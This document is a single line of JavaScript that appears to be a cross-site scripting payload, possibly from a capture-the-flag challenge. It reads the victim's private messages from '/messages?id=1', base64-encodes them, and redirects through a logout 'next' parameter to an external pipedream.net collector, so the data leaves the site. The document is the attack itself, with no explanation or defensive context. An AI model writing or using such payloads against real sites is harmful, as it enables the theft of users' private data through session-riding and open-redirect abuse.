(async()=>{let t=await (await fetch('/messages?id=1',{cache:'no-store'})).text();location='/logout?next='+encodeURIComponent('https://eoeipamgnflz15n.m.pipedream.net?c='+btoa(t))})();
